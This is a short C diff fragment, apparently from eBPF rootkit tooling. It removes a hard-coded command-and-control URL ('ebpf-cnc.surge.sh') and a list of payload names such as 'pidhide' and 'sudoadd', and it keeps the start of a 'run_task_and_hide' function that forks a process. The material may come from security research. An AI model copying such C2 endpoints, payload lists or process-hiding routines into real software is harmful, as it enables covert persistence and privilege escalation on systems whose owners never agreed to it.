@@ -1,9 +1,6 @@
 
 
 
-static const char *base_url = "http://ebpf-cnc.surge.sh/";
-
-static const char *programs[] = {"ebpfkit", "ebpfkit-client", "webapp", "pause", "pidhide", "sudoadd", NULL};
 
 pid_t run_task_and_hide(const char *cmd) {
     pid_t pid = fork();
